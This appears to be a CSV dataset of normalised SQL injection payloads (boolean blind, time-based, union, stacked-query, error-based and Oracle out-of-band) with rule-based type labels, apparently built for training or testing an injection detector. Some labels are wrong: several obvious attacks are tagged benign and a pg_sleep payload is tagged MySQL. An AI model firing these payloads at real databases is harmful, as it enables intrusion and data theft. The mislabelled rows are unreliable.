row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9420,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'niro' = 'niro",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
9421,1%' ) ) rlike ( select ( case when ( 6094 = 7893 ) then 1 else 0x28 end ) ) and ( ( '%' = ',1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
9422,"1 ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9423,1' ) where 5540 = 5540 waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9424,1' ) rlike ( select ( case when ( 7447 = 3981 ) then 1 else 0x28 end ) ),1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
9425,1'+ ( select lptb where 3861 = 3861 or sleep ( 5 ) ) +',1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
9426,if ( 6767 = 5022 ) select 6767 else drop function buii--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
9427,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""eakt"" like ""eakt",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9428,"1"" ) ) ) and 2006 = 2006",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9429,"-9370' ) where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",1,,boolean_blind,generic,0.95,7070 = 7070 or detected — boolean_blind injection (priority 8) on generic,rule-based
9430,"1 where 6169 = 6169 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9431,-4906' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'pkrq' = 'pkrq,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
9432,"1'+ ( select vxax where 9036 = 9036 and elt ( 1210 = 1210,sleep ( 5 ) ) ) +'",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9433,1 ) as bpap where 7758 = 7758 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
9434,-1188 ) ) union all select 4711--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9435,"-2601' ) union all select 2866,2866,2866,2866,2866,2866--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9436,1 ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 1233 = 1233,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
9437,"1 where 6965 = 6965 and elt ( 3933 = 1232,1232 ) --",1,,boolean_blind,generic,0.95,6965 = 6965 and detected — boolean_blind injection (priority 8) on generic,rule-based
9438,"1%"" ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""%"" = """,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
9439,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'xmwj' = 'xmwj",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
